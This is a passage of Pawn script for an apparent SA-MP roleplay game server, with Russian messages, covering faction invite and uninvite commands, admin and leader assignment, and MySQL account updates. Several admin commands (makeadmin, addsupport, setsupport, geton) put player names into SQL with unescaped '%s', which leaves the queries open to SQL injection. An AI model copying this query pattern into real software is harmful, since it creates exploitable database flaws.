						if(PlayerInfo[playerid][pLeader] == 33 || PlayerInfo[playerid][pMember] == 33 && PlayerInfo[playerid][pRank] == 9) { ftext = "Medic LV"; InviteSkin[para1] = 70;  }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						SetPlayerSkin(para1, 274);
						PlayerInfo[para1][pMember] = 33;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pRank] = 1;
						PlayerInfo[para1][pJob] = 0;
						PlayerInfo[para1][pModel] = 274;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 24 || PlayerInfo[playerid][pMember] == 24 && PlayerInfo[playerid][pRank] == 8)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок уже где то состоит");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 24 || PlayerInfo[playerid][pMember] == 24 && PlayerInfo[playerid][pRank] == 8) { ftext = "Hell's Angels MC"; InviteSkin[para1] = 247;  }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы были приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						SetPlayerSkin(para1, 247);
						PlayerInfo[para1][pMember] = 24;
						PlayerInfo[para1][pRank] = 1;
						PlayerInfo[para1][pJob] = 0;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pModel] = 247;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 26 || PlayerInfo[playerid][pMember] == 26 && PlayerInfo[playerid][pRank] == 8)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок уже где то состоит");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 26 || PlayerInfo[playerid][pMember] == 26 && PlayerInfo[playerid][pRank] == 8) { ftext = "Warlocks MC"; InviteSkin[para1] = 247;  }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы были приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						SetPlayerSkin(para1, 247);
						PlayerInfo[para1][pMember] = 26;
						PlayerInfo[para1][pRank] = 1;
						PlayerInfo[para1][pJob] = 0;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pModel] = 247;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 29 || PlayerInfo[playerid][pMember] == 29 && PlayerInfo[playerid][pRank] == 8)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок уже где то состоит");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 29 || PlayerInfo[playerid][pMember] == 29 && PlayerInfo[playerid][pRank] == 8) { ftext = "Pagans MC"; InviteSkin[para1] = 247;  }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы были приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						SetPlayerSkin(para1, 247);
						PlayerInfo[para1][pMember] = 29;
						PlayerInfo[para1][pRank] = 1;
						PlayerInfo[para1][pJob] = 0;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pModel] = 247;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 22 || PlayerInfo[playerid][pMember] == 22 && PlayerInfo[playerid][pRank] == 9)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок состоит в организации");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 22 || PlayerInfo[playerid][pMember] == 22 && PlayerInfo[playerid][pRank] == 9) { ftext = "Medic LS"; InviteSkin[para1] = 70;  }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						SetPlayerSkin(para1, 276);
						PlayerInfo[para1][pMember] = 22;
						PlayerInfo[para1][pRank] = 1;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pJob] = 0;
						PlayerInfo[para1][pModel] = 276;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else
			{
				SCM(playerid, COLOR_GRAD1, "Вам недоступна эта функция");
			}
		}
		mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pMember = '%i', pRank = '%i', pJob = '%i', pModel = '%i' WHERE name = '%e'", PlayerInfo[para1][pMember], PlayerInfo[para1][pRank], PlayerInfo[para1][pJob], PlayerInfo[para1][pModel], PlayerInfo[para1][pName]);
        mysql_function_query(DATABASE,QUERY,false,"","");
	}
	return true;
}
CMD:iinvite(playerid, params[])
{
	if(GetPVarInt(playerid, "Fraction_Duty") == 0) return SCM(playerid, COLOR_GREY, " Вам не доступна эта функция");
	new para1;
	if(sscanf(params,"d",para1)) return SCM(playerid, -1, " Введите: /iinvite [ID]");
	new ftext[25];
	if(para1 == INVALID_PLAYER_ID || !IsPlayerConnected(para1)) return SCM(playerid, COLOR_GREY, "Игрок не найден!");
	if(PlayerInfo[para1][pLevel] < 2) return SCM(playerid, COLOR_GREY, "Требуется 2 уровень");
	if(PlayerInfo[para1][pLeader] > 0) return SCM(playerid, COLOR_GREY, " Нельзя пригласить лидера.");
	if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pMember] == 1 && PlayerInfo[playerid][pRank] >= 13)
	{
		if(IsAArm(para1) && PlayerInfo[para1][pRank] >= 3) { ftext = "Полицию ЛС"; ChosenSkin[para1] = 280; }
		else return SCM(playerid, COLOR_GREY, "Этот игрок не отслужил");
	}
	else if (PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 2 && PlayerInfo[playerid][pRank] >= 9)
	{
		if(IsAArm(para1) && PlayerInfo[para1][pRank] >= 10 || IsACop(para1) && PlayerInfo[para1][pRank] >= 5) { ftext = "FBI"; ChosenSkin[para1] = 286; }
		else return SCM(playerid, COLOR_GREY, "Этот игрок не отслужил");
	}
	else if (PlayerInfo[playerid][pLeader] == 10 || PlayerInfo[playerid][pMember] == 10 && PlayerInfo[playerid][pRank] >= 13)
	{
		if(IsAArm(para1) && PlayerInfo[para1][pRank] >= 3) { ftext = "Полицию СФ"; ChosenSkin[para1] = 280; }
		else return SCM(playerid, COLOR_GREY, "Этот игрок не отслужил");
	}
	else if (PlayerInfo[playerid][pLeader] == 21 || PlayerInfo[playerid][pMember] == 21 && PlayerInfo[playerid][pRank] >= 13)
	{
		if(IsAArm(para1) && PlayerInfo[para1][pRank] >= 3) { ftext = "Полицию ЛВ"; ChosenSkin[para1] = 280; }
		else return SCM(playerid, COLOR_GREY, "Этот игрок не отслужил");
	}
	else return SCM(playerid,COLOR_GREY," Вам не доступна данная функция.");
	PlayerInfo[para1][pMember] = PlayerInfo[playerid][pMember];
	PlayerInfo[para1][pRank] = 1;
	SendMes(playerid, 0x6AB1FFAA, " Вы пригласили %s присоедениться к %s", PlayerInfo[para1][pName],ftext);
	SendMes(para1, 0x6AB1FFAA, " Вы были приглашены в %s лидером %s", ftext, PlayerInfo[playerid][pName]);
	PlayerInfo[para1][pJob] = 0;
	PlayerInfo[para1][pModel] = ChosenSkin[para1];
	SetPlayerSkin(para1, PlayerInfo[para1][pChar][0]);
	SetPVarInt(para1, "Fraction_Duty", 0);
	SetPlayerColor(para1, TEAM_HIT_COLOR);
	mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pMember = '%i', pRank = '%i', pJob = '%i', pModel = '%i' WHERE name = '%e'", PlayerInfo[para1][pMember], PlayerInfo[para1][pRank], PlayerInfo[para1][pJob], PlayerInfo[para1][pModel], PlayerInfo[para1][pName]);
    mysql_function_query(DATABASE,QUERY,false,"","");
	return true;
}
CMD:uninvite(playerid, params[])
{
	if(PlayerInfo[playerid][pLogin] == 0 || !GetPVarInt(playerid,"Fraction_Duty")) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(sscanf(params, "us[128]",params[0],params[1])) return SCM(playerid, -1, " Введите: /uninvite [id игрока] [причина]");
	if(PlayerInfo[playerid][pRank] <= PlayerInfo[params[0]][pRank]) return SCM(playerid, COLOR_GREY, " [Ошибка] Вы не можете уволить этого игрока");
	if(params[0] == playerid) return SCM(playerid,-1," Себя невозможно уволить");
	if(PlayerInfo[params[0]][pMember] == PlayerInfo[playerid][pLeader] || PlayerInfo[params[0]][pMember] == PlayerInfo[playerid][pMember])
	{
		if(!IsPlayerConnected(params[0])) return true;
		if(!CanUninviteforeach(playerid,params[0])) return true;
		if(PlayerInfo[params[0]][pMember] <= 0) return true;
		format(YCMDstr, sizeof(YCMDstr), " %s выгнал вас из организации. Причина: %s",Name(playerid),params[1]);
		SCM(params[0], COLOR_BLUE, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " Вы выгнали %s из организации. Причина: %s",Name(params[0]),params[1]);
		SCM(playerid, COLOR_BLUE, YCMDstr);
		SCM(params[0], COLOR_BLUE, " Вы снова гражданский");
		SCM(params[0], COLOR_BLUE, " Рабочий день окончен");
		if(GetPVarInt(params[0],"capture_on"))
		{
			DeletePVar(params[0],"capture_on");
			PlayerTextDrawHide(params[0], Capture[params[0]]);
			for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(params[0],INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
		}
		if(GetPVarInt(params[0],"mafia_war"))
		{
			DeletePVar(params[0],"mafia_war");
			PlayerTextDrawHide(params[0], Capture[params[0]]);
			for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(params[0],INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
		}
		if(GetPVarInt(params[0],"biker_capt"))
		{
			DeletePVar(params[0],"biker_capt");
			PlayerTextDrawHide(params[0], Capture[params[0]]);
			DestroyDynamic3DTextLabel(BikerText[params[0]]);
			for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(params[0],INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
		}
		PlayerInfo[params[0]][pMember] = 0;
		PlayerInfo[params[0]][pLeader] = 0;
		PlayerInfo[params[0]][pJobHeal] = 0;
		PlayerInfo[params[0]][pRank] = 0;
		PlayerInfo[params[0]][pModel] = 0;
		DeletePVar(params[0],"Fraction_Duty");
		SetPlayerArmourAC(params[0],0);
		ResetPlayerWeapons(params[0]);
		DelGun(params[0]);
		SpawnChange[params[0]] = 0;
		SetPlayerColor(params[0], TEAM_HIT_COLOR);
		SetPlayerSkin(params[0], PlayerInfo[params[0]][pChar][0]);
		mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pMember = '%i', pLeader = '%i', pJobHeal = '%i', pRank = '%i', pModel = '%i' WHERE name = '%e'", PlayerInfo[params[0]][pMember], PlayerInfo[params[0]][pLeader], PlayerInfo[params[0]][pJobHeal], PlayerInfo[params[0]][pRank], PlayerInfo[params[0]][pModel], PlayerInfo[params[0]][pName]);
        mysql_function_query(DATABASE,QUERY,false,"","");
	}
	return true;
}
CMD:auninvite(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	if(sscanf(params, "us[128]",params[0],params[1])) return SCM(playerid, -1, " Введите: /auninvite [playerid] [причина]");
	if(!IsPlayerConnected(params[0])) return true;
	if(PlayerInfo[params[0]][pMember] == 0 || PlayerInfo[params[0]][pLeader]) return SCM(playerid, COLOR_GREY, " Игрок не состоит в организации");
	format(YCMDstr, sizeof(YCMDstr), " %s выгнал вас из организации. Причина: %s",Name(playerid),params[1]);
	SCM(params[0], COLOR_BLUE, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Вы выгнали %s из организации. Причина: %s",Name(params[0]),params[1]);
	SCM(playerid, COLOR_BLUE, YCMDstr);
	SCM(params[0], COLOR_BLUE, " Вы снова гражданский");
	SCM(params[0], COLOR_BLUE, " Рабочий день окончен");
	if(GetPVarInt(params[0],"capture_on"))
	{
		DeletePVar(params[0],"capture_on");
		PlayerTextDrawHide(params[0], Capture[params[0]]);
		for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(params[0],INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
	}
	if(GetPVarInt(params[0],"mafia_war"))
	{
		DeletePVar(params[0],"mafia_war");
		PlayerTextDrawHide(params[0], Capture[params[0]]);
		for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(params[0],INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
	}
	if(GetPVarInt(params[0],"biker_capt"))
	{
		DeletePVar(params[0],"biker_capt");
		PlayerTextDrawHide(params[0], Capture[params[0]]);
		DestroyDynamic3DTextLabel(BikerText[params[0]]);
		for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(params[0],INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
	}
	PlayerInfo[params[0]][pMember] = 0;
	PlayerInfo[params[0]][pLeader] = 0;
	PlayerInfo[params[0]][pRank] = 0;
	PlayerInfo[params[0]][pJobHeal] = 0;
	PlayerInfo[params[0]][pModel] = 0;
	DeletePVar(params[0],"Fraction_Duty");
	SpawnChange[params[0]] = 0;
	SetPlayerArmourAC(params[0],0);
	ResetPlayerWeapons(params[0]);
	DelGun(params[0]);
	SpawnPlayer(params[0]);
	SetPlayerColor(params[0], TEAM_HIT_COLOR);
	SetPlayerSkin(params[0],PlayerInfo[params[0]][pChar][0]);
	mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pMember = '%i', pLeader = '%i', pJobHeal = '%i', pRank = '%i', pModel = '%i' WHERE name = '%e'", PlayerInfo[params[0]][pMember], PlayerInfo[params[0]][pLeader], PlayerInfo[params[0]][pJobHeal], PlayerInfo[params[0]][pRank], PlayerInfo[params[0]][pModel], PlayerInfo[params[0]][pName]);
    mysql_function_query(DATABASE,QUERY,false,"","");
	return true;
}
CMD:gotocar(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /gotocar [carid]");
	new Float:x, Float:y, Float:z;
	GetVehiclePos(params[0], x, y, z);
	SetPlayerVirtualWorld(playerid, GetVehicleVirtualWorld(params[0]));
	if(IsPlayerInAnyVehicle(playerid))
	{
		SetVehiclePos(GetPlayerVehicleID(playerid), x+1,y+1,z);
		return true;
	}
	SetPlayerPos(playerid, x+1, y+1, z);
	return true;
}
CMD:makeadmin(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	new name[32];
	if(sscanf(params, "s[32]d", name, params[0])) return SCM(playerid, -1, " Введите: /makeadmin [ник] [уровень администратора]");
	if((params[0] > 5 || params[0] < 0) && PlayerInfo[playerid][pAdmin] < 10) return SCM(playerid, COLOR_GREY, " Ошибка. От 0 до 5");
	else if((params[0] > 10 || params[0] < 0) && PlayerInfo[playerid][pAdmin] > 9) return SCM(playerid, COLOR_GREY, " Ошибка. От 0 до 10");
	
	mysql_format(DATABASE, QUERY, 100, "SELECT `level` FROM `"TABLE_ADMIN"` WHERE `Name` = '%s' LIMIT 1", name);
	mysql_query(DATABASE, QUERY);
	new r = cache_num_rows();
	if(r)//cache_num_rows(r))
	{
		new levels = cache_get_field_content_int(0,"level");
		if(levels > PlayerInfo[playerid][pAdmin]) return SCM(playerid, COLOR_GREY, " Вы не можете понизить этого администратора!");
	}
	SendMes(playerid,0x6495EDFF," Вы установили %s %d уровень администрирования",name,params[0]);
	mysql_format(DATABASE,QUERY, 128, "SELECT * FROM "TABLE_ADMIN" WHERE `name` = '%s' LIMIT 1", name);
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",17,params[0],name);
	mysql_format(DATABASE,QUERY, 128, "SELECT * FROM "TABLE_ACCOUNTS" WHERE `name` = '%s' LIMIT 1", name);
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",17,params[0],name);
	printf("Администратор %s назначил %s модератором %i уровня", PlayerInfo[playerid][pName], name, params[0]);
	return true;
}
CMD:addsupport(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 9) return true;
	new name[32], var;
	if(sscanf(params, "s[32]i", name, var)) return SCM(playerid, -1, " Введите: /addsupport [Ник] [1 - назначить | 0 - снять]");
	//sscanf(params, "s[32]i", name, var);
	new para1 = GetPlayerID(name);
	if(IsPlayerConnected(para1) && para1 != INVALID_PLAYER_ID) {
		if(var == 1) {
			PlayerInfo[para1][pHelper] = 2;
			mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pHelper = '2' WHERE name = '%s'",name);
			format(YCMDstr, sizeof(YCMDstr), " Вы назначили %s[%i] саппортом", name, para1);
		} else {
			PlayerInfo[para1][pHelper] = 0;
			mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pHelper = '0' WHERE name = '%s'",name);
			format(YCMDstr, sizeof(YCMDstr), " Вы сняли %s[%i] с саппорта", name, para1);
		}
	} else {
		if(var == 1) {
			mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pHelper = '2' WHERE name = '%s'",name);
			format(YCMDstr, sizeof(YCMDstr), " Вы назначили %s саппортом", name);
		} else {
			mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pHelper = '0' WHERE name = '%s'",name);
			format(YCMDstr, sizeof(YCMDstr), " Вы сняли %s с саппорта", name);
		}
	}
	mysql_function_query(DATABASE,QUERY,false,"","");
	SCM(playerid, COLOR_YELLOW2, YCMDstr);
	printf("Администратор %s назначил %s саппортом", PlayerInfo[playerid][pName], name);
	return true;
}
CMD:setsupport(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5) return true;
	new name[32], var;
	if(sscanf(params, "s[32]i", name, var)) return SCM(playerid, -1, " Введите: /setsupport [Ник] [1 - назначить | 0 - снять]");
	new para1 = GetPlayerID(name);
	if(IsPlayerConnected(para1) && para1 != INVALID_PLAYER_ID) {
		if(var == 1) {
			PlayerInfo[para1][pHelper] = 1;
			mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pHelper = '1' WHERE name = '%s'",name);
			format(YCMDstr, sizeof(YCMDstr), " Саппорт разморожен");
		} else {
			PlayerInfo[para1][pHelper] = 2;
			mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pHelper = '2' WHERE name = '%s'",name);
			format(YCMDstr, sizeof(YCMDstr), " Саппорт заморожен");
		}
	} else {
		if(var == 1) {
			mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pHelper = '1' WHERE name = '%s'",name);
			format(YCMDstr, sizeof(YCMDstr), " Саппорт разморожен");
		} else {
			mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pHelper = '2' WHERE name = '%s'",name);
			format(YCMDstr, sizeof(YCMDstr), " Саппорт заморожен");
		}
	}
	mysql_function_query(DATABASE,QUERY,false,"","");
	SCM(playerid, -1, YCMDstr);
	if(var == 0) printf("Администратор %s заморозил саппорта %s", PlayerInfo[playerid][pName], name);
	else printf("Администратор %s разморозил саппорта %s", PlayerInfo[playerid][pName], name);
	return true ;
}
CMD:geton(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s[63]",params[0])) return SCM(playerid,COLOR_GREY, " Введите: /geton [name]");
	mysql_format(DATABASE,QUERY, 256, "SELECT * FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%s'",params[0]);
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",18,playerid,params[0]);
	return true;
}
CMD:getleader(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /getleader [номер фракции]");
	mysql_format(DATABASE,QUERY, 256, "SELECT * FROM `"TABLE_ACCOUNTS"` WHERE `pLeader` = '%i'",params[0]);
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",19,playerid,params[0]);
	return true;
}
CMD:makeleader(playerid, params[])
{
	new para1,level;
	if(PlayerInfo[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ud",para1,level)) return SCM(playerid, -1, " Введите: /makeleader [id игрока] [Number(1-33)]");
	if(level > 29 || level < 0) { SCM(playerid, COLOR_GREY, " Нельзя меньше 0 или больше 29!"); return true; }
	if(!IsPlayerConnected(para1)) return true;
	if(level == 0)
	{
		PlayerInfo[para1][pRank] = 0;
		PlayerInfo[para1][pMember] = 0;
		PlayerInfo[para1][pLeader] = 0;
		PlayerInfo[para1][pModel] = 0;
		if(GetPVarInt(para1,"capture_on") || GetPVarInt(para1,"mafia_war"))
		{
			DeletePVar(para1,"capture_on"); DeletePVar(para1,"mafia_war");
			PlayerTextDrawHide(para1, Capture[para1]);
			for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(para1,INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
		}
		if(GetPVarInt(para1,"mafia_war"))
		{
			DeletePVar(para1,"mafia_war");
			PlayerTextDrawHide(para1, Capture[para1]);
			for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(para1,INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
		}
		if(GetPVarInt(para1,"biker_capt"))
		{
			DeletePVar(para1,"biker_capt");
			PlayerTextDrawHide(para1, Capture[para1]);
			DestroyDynamic3DTextLabel(BikerText[para1]);
			for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(para1,INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
		}
		SpawnChange[para1] = 1;
		SCM(para1, 0x6AB1FFAA," Вы были сняты со своей должности");
		SendMes(para1, 0x6AB1FFAA, " Администратор %s снял вас с поста лидерства",Name(playerid));
		SendMes(playerid,0x6AB1FFAA, " Вы назначили %s контролировать фракцию 0",Name(para1));
		SetPlayerArmourAC(para1,0);
		SetPlayerHealthAC(para1,100);
		PlayerInfo[para1][pSpawnChange][1] = 1;
		PlayerInfo[para1][pHP] = 100;
		SetPlayerToTeamColor(para1);
		DelGun(para1);
		DeletePVar(para1,"Fraction_Duty");
		SetPlayerSkin(para1, PlayerInfo[para1][pChar][0]);
		mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pLeader = '%i', pMember = '%i', pRank = '%i', pModel = '%i' WHERE name = '%e'", PlayerInfo[para1][pLeader], PlayerInfo[para1][pMember], PlayerInfo[para1][pRank], PlayerInfo[para1][pModel], PlayerInfo[para1][pName]);
	    mysql_function_query(DATABASE,QUERY,false,"","");
	    return true;
	}
	if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, " У игрока имеется предупреждение (warn)");
	if(PlayerInfo[para1][pLeader] == 0 && PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, " Игрок состоит во Фракции / Банде!");
	if(PlayerInfo[para1][pLeader] == 1) return SCM(playerid, -1, "Игрок находится на посту лидера ( Снять лидера можно ./makeleader ID 0 )");
	if(level == 1){ PlayerInfo[para1][pRank] = 14; InviteSkin[para1] = 283; } //Police Force
	else if(level == 2) { PlayerInfo[para1][pRank] = 10; InviteSkin[para1] = 166; } //FBI
	else if(level == 3) { PlayerInfo[para1][pRank] = 15; InviteSkin[para1] = 287; } //Army
	else if(level == 4) { PlayerInfo[para1][pJobHeal] = 1; PlayerInfo[para1][pRank] = 10; InviteSkin[para1] = 70; } //Ambulance
	else if(level == 5) { PlayerInfo[para1][pRank] = 10; InviteSkin[para1] = 113; } //La Cosa Nostra
	else if(level == 6) { PlayerInfo[para1][pRank] = 10; InviteSkin[para1] = 120; } //Yakuza
	else if(level == 7) { PlayerInfo[para1][pRank] = 6; InviteSkin[para1] = 147; } //мэрия
	else if(level == 9) { PlayerInfo[para1][pRank] = 10; InviteSkin[para1] = 261; } //News Reporters
	else if(level == 10) { PlayerInfo[para1][pRank] = 14; InviteSkin[para1] = 283; } //SFPD
	else if(level == 11) { PlayerInfo[para1][pRank] = 10; InviteSkin[para1] = 240; } //Driving/Flying School
	else if(level == 12) { PlayerInfo[para1][pRank] = 10; InviteSkin[para1] = 104; } //Ballas
	else if(level == 13) { PlayerInfo[para1][pRank] = 10; InviteSkin[para1] = 110; } //Vagos
	else if(level == 14) { PlayerInfo[para1][pRank] = 10; InviteSkin[para1] = 125; } //Russian Mafia
	else if(level == 15) { PlayerInfo[para1][pRank] = 10; InviteSkin[para1] = 270; } //Groove
	else if(level == 16) { PlayerInfo[para1][pRank] = 10; InviteSkin[para1] = 261; } //News Reporters
	else if(level == 17) { PlayerInfo[para1][pRank] = 10; InviteSkin[para1] = 115; } //Aztecas
	else if(level == 18) { PlayerInfo[para1][pRank] = 10; InviteSkin[para1] = 173; } //Rifa
	else if(level == 19) { PlayerInfo[para1][pRank] = 15; InviteSkin[para1] = 287; } //Army
	else if(level == 20) { PlayerInfo[para1][pRank] = 10; InviteSkin[para1] = 261; } //News Reporters
	else if(level == 21) { PlayerInfo[para1][pRank] = 14; InviteSkin[para1] = 283; } //LVPD
	else if(level == 24) { PlayerInfo[para1][pRank] = 9; InviteSkin[para1] = 100; } // Hell's Angels
	else if(level == 26) { PlayerInfo[para1][pRank] = 9; InviteSkin[para1] = 100; } //Warlock
	else if(level == 29) { PlayerInfo[para1][pRank] = 9; InviteSkin[para1] = 100; } //Pagans
	PlayerInfo[para1][pLeader] = level;
	PlayerInfo[para1][pMember] = level;
	PlayerInfo[para1][pJob] = 0;
	format(YCMDstr, sizeof(YCMDstr), " Администратор %s назначил вас контролировать данную организацию",Name(playerid));
	SCM(para1, 0x6AB1FFAA, YCMDstr);
	SpawnChange[para1] = 1;
	format(YCMDstr, sizeof(YCMDstr), " Вы назначили %s контролировать фракцию %i",Name(para1),level);
	SCM(playerid,0x6AB1FFAA, YCMDstr);
	PlayerInfo[para1][pModel] = InviteSkin[para1];
	SetPlayerArmourAC(para1,0);
	SetPlayerHealthAC(para1,100);
	PlayerInfo[para1][pHP] = 100;
	SetPlayerToTeamColor(para1);
	SetPlayerSkin(para1, InviteSkin[para1]);
	SetPVarInt(para1,"Fraction_Duty",1);
	PlayerInfo[playerid][pSpawnChange][1] = 1;
	new year, month, day, hour, minute, second;
	getdate(year, month, day);
	gettime(hour, minute, second);
	mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pOnlineLid = '%04i/%02i/%02i %02i:%02i:%02i', pLeader = '%i', pMember = '%i', pRank = '%i', pModel = '%i', pJob = '%i' WHERE name = '%e'", year, month, day, hour, minute, second, PlayerInfo[para1][pLeader], PlayerInfo[para1][pMember], PlayerInfo[para1][pRank], PlayerInfo[para1][pModel], PlayerInfo[para1][pJob], PlayerInfo[para1][pName]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	printf("Администратор %s назначил %s контролировать организацию: %i", PlayerInfo[playerid][pName], PlayerInfo[para1][pName], level);
	return true;
}
CMD:demote(playerid, params[])
{
	if(GetPVarInt(playerid, "Fraction_Duty") == 0) return SCM(playerid, COLOR_GREY, " Функция доступна Мэру и ФБР с 6 ранга");
